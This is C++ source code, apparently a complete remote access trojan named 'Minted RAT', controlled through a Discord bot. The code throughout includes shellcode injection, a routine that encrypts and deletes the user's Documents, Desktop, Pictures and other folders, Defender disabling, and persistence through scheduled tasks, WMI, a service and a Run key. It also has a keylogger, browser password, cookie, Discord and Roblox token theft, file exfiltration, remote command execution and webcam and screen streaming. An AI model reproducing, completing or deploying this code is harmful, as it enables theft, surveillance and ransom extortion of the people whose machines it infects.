    void* mem = VirtualAlloc(NULL, sc.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(mem, sc.data(), sc.size());
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
}
void ransomEncrypt() {
    BYTE key[32] = { 0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f,0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x19,0x1a,0x1b,0x1c,0x1d,0x1e,0x1f };
    BYTE iv[16] = { 0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f };
    BCRYPT_ALG_HANDLE hAlg; BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CTR, sizeof(BCRYPT_CHAIN_MODE_CTR), 0);
    BCRYPT_KEY_HANDLE hKey; BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, sizeof(key), 0);
    std::vector<std::wstring> dirs;
    dirs.push_back(std::wstring(GetKnownFolderPath(FOLDERID_Documents).begin(), GetKnownFolderPath(FOLDERID_Documents).end()));
    dirs.push_back(std::wstring(GetKnownFolderPath(FOLDERID_Desktop).begin(), GetKnownFolderPath(FOLDERID_Desktop).end()));
    dirs.push_back(std::wstring(GetKnownFolderPath(FOLDERID_Pictures).begin(), GetKnownFolderPath(FOLDERID_Pictures).end()));
    dirs.push_back(std::wstring(GetKnownFolderPath(FOLDERID_Videos).begin(), GetKnownFolderPath(FOLDERID_Videos).end()));
    dirs.push_back(std::wstring(GetKnownFolderPath(FOLDERID_Music).begin(), GetKnownFolderPath(FOLDERID_Music).end()));
    dirs.push_back(std::wstring(GetKnownFolderPath(FOLDERID_Downloads).begin(), GetKnownFolderPath(FOLDERID_Downloads).end()));
    for (auto& d : dirs) for (auto& f : fs::recursive_directory_iterator(d)) {
        if (f.is_regular_file()) {
            std::wstring ext = f.path().extension(); if (ext == L".minted") continue;
            std::ifstream in(f.path(), std::ios::binary); std::vector<BYTE> data((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>()); in.close();
            ULONG outLen = 0; BCryptEncrypt(hKey, data.data(), data.size(), NULL, iv, sizeof(iv), NULL, 0, &outLen, 0);
            std::vector<BYTE> enc(outLen);
            BCryptEncrypt(hKey, data.data(), data.size(), NULL, iv, sizeof(iv), enc.data(), outLen, &outLen, 0);
            std::ofstream out(f.path().wstring() + L".minted", std::ios::binary); out.write((char*)enc.data(), enc.size()); out.close();
            DeleteFileW(f.path().c_str());
        }
    }
    BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlg, 0);
}
void setupChannels() {
    bot->channel_create(dpp::channel().set_guild_id(GUILD_ID).set_name("minted-" + std::to_string(GetTickCount64())).set_type(dpp::CHANNEL_CATEGORY), [](const dpp::confirmation_callback_t& res) {
        if (!res.is_error()) {
            dpp::channel cat = std::get<dpp::channel>(res.value);
            channels["cat"] = cat.id;
            bot->channel_create(dpp::channel().set_guild_id(GUILD_ID).set_name("info").set_type(dpp::CHANNEL_TEXT).set_parent_id(cat.id), [](const dpp::confirmation_callback_t& cr) { if (!cr.is_error()) { dpp::channel c = std::get<dpp::channel>(cr.value); channels["info"] = c.id; } });
            bot->channel_create(dpp::channel().set_guild_id(GUILD_ID).set_name("main").set_type(dpp::CHANNEL_TEXT).set_parent_id(cat.id), [](const dpp::confirmation_callback_t& cr) { if (!cr.is_error()) { channels["main"] = std::get<dpp::channel>(cr.value).id; } });
            bot->channel_create(dpp::channel().set_guild_id(GUILD_ID).set_name("files").set_type(dpp::CHANNEL_TEXT).set_parent_id(cat.id), [](const dpp::confirmation_callback_t& cr) { if (!cr.is_error()) { channels["files"] = std::get<dpp::channel>(cr.value).id; } });
            bot->channel_create(dpp::channel().set_guild_id(GUILD_ID).set_name("alert").set_type(dpp::CHANNEL_TEXT).set_parent_id(cat.id), [](const dpp::confirmation_callback_t& cr) { if (!cr.is_error()) { channels["alert"] = std::get<dpp::channel>(cr.value).id; } });
            bot->channel_create(dpp::channel().set_guild_id(GUILD_ID).set_name("spam").set_type(dpp::CHANNEL_TEXT).set_parent_id(cat.id), [](const dpp::confirmation_callback_t& cr) { if (!cr.is_error()) { channels["spam"] = std::get<dpp::channel>(cr.value).id; } });
            bot->channel_create(dpp::channel().set_guild_id(GUILD_ID).set_name("recordings").set_type(dpp::CHANNEL_TEXT).set_parent_id(cat.id), [](const dpp::confirmation_callback_t& cr) { if (!cr.is_error()) { channels["recordings"] = std::get<dpp::channel>(cr.value).id; } });
            bot->channel_create(dpp::channel().set_guild_id(GUILD_ID).set_name("live-mic").set_type(dpp::CHANNEL_TEXT).set_parent_id(cat.id), [](const dpp::confirmation_callback_t& cr) { if (!cr.is_error()) { channels["livemic"] = std::get<dpp::channel>(cr.value).id; } });
            HKEY hKey; RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Minted", &hKey);
            RegSetValueExW(hKey, L"cat", 0, REG_QWORD, (BYTE*)&cat.id, 8);
            RegSetValueExW(hKey, L"info", 0, REG_QWORD, (BYTE*)&channels["info"], 8);
            RegCloseKey(hKey);
        }
    });
}
void loadChannels() {
    HKEY hKey; if (RegOpenKeyW(HKEY_CURRENT_USER, L"Software\\Minted", &hKey) == ERROR_SUCCESS) {
        DWORD type; DWORDLONG val; DWORD sz = sizeof(val);
        auto get = [&](const std::string& name) -> dpp::snowflake {
            RegQueryValueExW(hKey, std::wstring(name.begin(), name.end()).c_str(), NULL, &type, (BYTE*)&val, &sz);
            sz = sizeof(val);
            return val;
        };
        channels["info"] = get("info"); channels["main"] = get("main"); channels["files"] = get("files");
        channels["alert"] = get("alert"); channels["spam"] = get("spam"); channels["recordings"] = get("recordings"); channels["livemic"] = get("livemic");
        RegCloseKey(hKey);
    } else setupChannels();
}
int main() {
    if (checkVM() || checkDebugger()) return 1;
    FreeConsole();
    disableDefender();
    killMonitors();
    addScheduledTask(); addWMIEvent(); addService(); addRegRun();
    std::thread watchdog(persistenceWatchdog);
    startKeylogger();
    std::thread keylogSender([]() { while (true) { Sleep(5000); keylogFlush(); } });
    bot = new dpp::cluster(BOT_TOKEN);
    bot->on_ready([&](const dpp::ready_t& ev) {
        loadChannels();
        std::string info = exec("systeminfo");
        sendChannel("info", info);
        HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        HINTERNET hConnect = WinHttpConnect(hSession, L"ipinfo.io", INTERNET_DEFAULT_HTTPS_PORT, 0);
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/json", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
        WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
        WinHttpReceiveResponse(hRequest, NULL);
        std::string geo; DWORD read; char buf[1024];
        while (WinHttpReadData(hRequest, buf, sizeof(buf), &read) && read) geo.append(buf, read);
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
        sendChannel("info", geo);
        sendChannel("alert", "@everyone Minted RAT connected: " + exec("hostname"));
    });
    bot->on_message_create([&](const dpp::message_create_t& ev) {
        std::string content = ev.msg.content;
        if (content == "!shutdown") system("shutdown /s /t 0");
        else if (content == "!restart") system("shutdown /r /t 0");
        else if (content == "!logoff") ExitWindowsEx(EWX_LOGOFF, 0);
        else if (content == "!sleep") SetSuspendState(FALSE, FALSE, FALSE);
        else if (content == "!hibernate") SetSuspendState(TRUE, FALSE, FALSE);
        else if (content == "!hide") ShowWindow(GetConsoleWindow(), SW_HIDE);
        else if (content.starts_with("!exec ")) sendChannel("main", exec(content.substr(6).c_str()));
        else if (content == "!sysinfo" || content == "!info") sendChannel("info", exec("systeminfo"));
        else if (content == "!listprocesses") sendChannel("main", exec("tasklist"));
        else if (content.starts_with("!processinfo ")) { std::string pid = content.substr(13); sendChannel("main", exec(("tasklist /FI \"PID eq "+pid+"\" /V").c_str())); }
        else if (content == "!connections") sendChannel("main", exec("netstat -ano"));
        else if (content == "!drives") sendChannel("main", exec("wmic logicaldisk get size,freespace,caption"));
        else if (content.starts_with("!listdir ")) { std::string p = content.substr(9); sendChannel("main", exec(("dir \""+p+"\" /s").c_str())); }
        else if (content.starts_with("!download ")) {
            std::string path = content.substr(10);
            std::ifstream file(path, std::ios::binary); if (!file) { sendChannel("main", "File not found"); return; }
            std::string data((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
            bot->message_create(dpp::message(ev.msg.channel_id, "", dpp::attachment(fs::path(path).filename().string(), data)));
        } else if (content.starts_with("!zip ")) {
            std::string folder = content.substr(5);
            std::string cmd = "powershell Compress-Archive -Path '" + folder + "' -DestinationPath '" + folder + ".zip'";
            system(cmd.c_str()); std::ifstream z(folder+".zip", std::ios::binary); std::string zd((std::istreambuf_iterator<char>(z)), std::istreambuf_iterator<char>());
            bot->message_create(dpp::message(ev.msg.channel_id, "", dpp::attachment(fs::path(folder).filename().string()+".zip", zd)));
        } else if (content == "!wifi") sendChannel("main", exec("netsh wlan show profiles"));
        else if (content == "!clipboard") {
            if (OpenClipboard(NULL)) { HANDLE h = GetClipboardData(CF_TEXT); if (h) { char* txt = (char*)GlobalLock(h); sendChannel("main", txt); GlobalUnlock(h); } CloseClipboard(); }
        } else if (content == "!grab") sendChannel("main", stealChromePasswords());
        else if (content == "!grabedge") sendChannel("main", stealEdgePasswords());
        else if (content == "!grabfirefox") sendChannel("main", stealFirefoxPasswords());
        else if (content == "!roblox") sendChannel("main", stealRobloxToken());
        else if (content == "!token") sendChannel("main", stealDiscordToken());
        else if (content == "!cookies") sendChannel("main", stealCookies());
        else if (content == "!ss") { int w,h; HBITMAP b = CaptureScreen(w,h); std::string p = bmpToPNG(b); bot->message_create(dpp::message(ev.msg.channel_id, "", dpp::attachment("screenshot.png", p))); DeleteObject(b); }
        else if (content == "!webcam") {
            HWND hWndC = capCreateCaptureWindowW(L"web", WS_CHILD, 0,0,1,1, GetDesktopWindow(),0);
            capDriverConnect(hWndC,0); capGrabFrame(hWndC); HBITMAP hb = capGetFrameBitmap(hWndC); std::string p = bmpToPNG(hb);
            bot->message_create(dpp::message(ev.msg.channel_id, "", dpp::attachment("webcam.png", p))); DeleteObject(hb); capDriverDisconnect(hWndC); DestroyWindow(hWndC);
        } else if (content == "!livescreen") { liveScreenActive = true; liveScreenThread = std::thread(streamScreen); }
        else if (content == "!livestop") { liveScreenActive = false; if (liveScreenThread.joinable()) liveScreenThread.join(); liveWebcamActive = false; if (liveWebcamThread.joinable()) liveWebcamThread.join(); }
        else if (content == "!livewebcam") { liveWebcamActive = true; liveWebcamThread = std::thread(streamWebcam); }
        else if (content == "!ransomware") { ransomEncrypt(); }
        else if (content == "!selfdestruct") { removePersistence(); sendChannel("alert", "Self-destructing..."); bot->message_create(dpp::message(ev.msg.channel_id, "Goodbye")); exit(0); }
    });
    bot->start(dpp::st_return);
    return 0;
}
